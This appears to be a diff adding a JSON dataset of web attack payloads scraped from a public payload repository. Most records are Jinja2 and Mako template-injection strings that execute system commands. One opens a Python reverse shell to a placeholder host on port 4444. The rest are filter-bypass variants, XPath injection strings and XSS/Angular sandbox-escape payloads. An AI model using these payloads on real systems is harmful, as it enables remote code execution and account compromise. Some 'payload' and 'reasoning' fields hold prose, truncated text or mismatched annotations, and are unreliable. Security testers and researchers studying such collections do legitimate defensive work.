+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Similar payloads could be used for Error-Based and Boolean-Based exploitation:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{ lipsum.__globals__[\"os\"].popen('id').read() }}",
+  "context": "Exploit The SSTI By Calling os.popen().read()",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
+  "context": "Exploit The SSTI By Calling subprocess.Popen",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": ":warning: the number 396 will vary depending of the application.",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+  "context": "Exploit The SSTI By Calling subprocess.Popen",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": ":warning: the number 396 will vary depending of the application.",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}",
+  "context": "Exploit The SSTI By Calling Popen Without Guessing The Offset",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",
+  "context": "Exploit The SSTI By Calling Popen Without Guessing The Offset",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Simple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable na",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}",
+  "context": "Jinja2 - Remote Command Execution with Obfuscation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Execute the system command `id`:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request|attr([\"__\",\"class\",\"__\"]|join)}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request|attr(\"__class__\")}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request.__class__}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `_`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `[` and `]`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `[` and `]`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing `|join`",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
+  "context": "Jinja2 - Filter Bypass",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${x}",
+  "context": "Mako",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "[Official website](https://www.makotemplates.org/)\n> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the famili",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.__init__.__globals__['util'].os.system('id')}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.filters.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.exceptions.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.__init__.__globals__['os'].system('id')}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.util.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.util.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.cache.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.filters.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.filters.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.exceptions.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.cache.util.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Any of these payloads allows direct access to the `os` module",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "print(Template(\"${self.module.cache.util.os}\").render())",
+  "context": "Mako - Remote Command Execution",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "PoC :",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}",
+  "context": "Mako - Remote Command Execution with Obfuscation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "Execute the system command `id`:",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}",
+  "context": "Mako - Remote Command Execution with Obfuscation",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```python\n${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}\n```",
+  "source": "payloads/server side template injection/python.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "' or '1'='1",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "' or ''='",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "x' or 1=1 or 'x'='y",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "x' or name()='username' or 'x'='y",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "' and count(/*)=1 and '1'='1",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "' and count(/@*)=1 and '1'='1",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "' and count(/comment())=1 and '1'='1",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "') and contains(../password,'c",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "general",
+  "payload": "') and starts-with(../password,'c",
+  "context": "Methodology",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```ps1\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+  "source": "payloads/xpath injection/readme.md"
+ },
+ {
+  "vuln_type": "xss",
+  "payload": "<svg\fonload\f=\falert(1)\f>",
+  "context": "Bypass Space Filter",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```javascript\n    <img/src='1'/onerror=alert(0)>",
+  "source": "payloads/xss injection/1 - xss filter bypass.md"
+ },
+ {
+  "vuln_type": "xss",
+  "payload": "An example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:",
+  "context": "Bypass using Unicode",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```html\n<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
+  "source": "payloads/xss injection/1 - xss filter bypass.md"
+ },
+ {
+  "vuln_type": "xss",
+  "payload": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+  "context": "Advanced Bypassing XSS",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,1",
+  "source": "payloads/xss injection/5 - xss in angular.md"
+ },
+ {
+  "vuln_type": "xss",
+  "payload": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+  "context": "Advanced Bypassing XSS",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,1",
+  "source": "payloads/xss injection/5 - xss in angular.md"
+ },
+ {
+  "vuln_type": "xss",
+  "payload": "Better payload replacing `<script>alert(1)</script>`:",
+  "context": "Identify an XSS Endpoint",
+  "target_tech": "",
+  "bypass_technique": "",
+  "reasoning": "```javascript\n<script>debugger;</script>",
+  "source": "payloads/xss injection/readme.md"
+ }
+]
